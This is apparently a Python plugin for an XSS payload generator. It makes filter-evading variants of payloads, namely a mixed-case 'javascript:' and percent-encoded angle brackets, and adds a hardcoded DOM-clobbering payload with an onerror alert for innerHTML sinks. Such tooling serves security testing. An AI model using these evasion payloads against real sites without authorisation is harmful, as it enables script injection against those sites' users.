from __future__ import annotations

from ai_xss_generator.types import ParsedContext, PayloadCandidate


class BasicMutators:
    name = "basic-mutators"

    def mutate(
        self,
        payloads: list[PayloadCandidate],
        context: ParsedContext,
    ) -> list[PayloadCandidate]:
        mutated: list[PayloadCandidate] = []
        for payload in payloads[:12]:
            if "javascript:" in payload.payload:
                mutated.append(
                    PayloadCandidate(
                        payload=payload.payload.replace("javascript:", "JaVaScRiPt:"),
                        title=f"{payload.title} (case variant)",
                        explanation="Case-shifted protocol variant for naive deny-list bypasses.",
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "case-variant"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    )
                )
            if "<" in payload.payload and ">" in payload.payload:
                mutated.append(
                    PayloadCandidate(
                        payload=payload.payload.replace("<", "%3C").replace(">", "%3E"),
                        title=f"{payload.title} (encoded)",
                        explanation="Percent-encoded variant for double-decoding or URL-to-DOM flows.",
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "encoding"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    )
                )
        if any(sink.sink == "innerHTML" for sink in context.dom_sinks):
            mutated.append(
                PayloadCandidate(
                    payload='<form id=forms><input name=innerHTML value="<img src=x onerror=alert(1)>"></form>',
                    title="DOM clobber + property sink chain",
                    explanation="Probes DOM clobbering followed by property-driven HTML insertion.",
                    test_vector="Inject into HTML sinks, then inspect whether named properties shadow DOM references.",
                    tags=["dom-clobber", "chain", "innerHTML"],
                    target_sink="innerHTML",
                    source="mutator",
                )
            )
        return mutated


PLUGIN = BasicMutators()
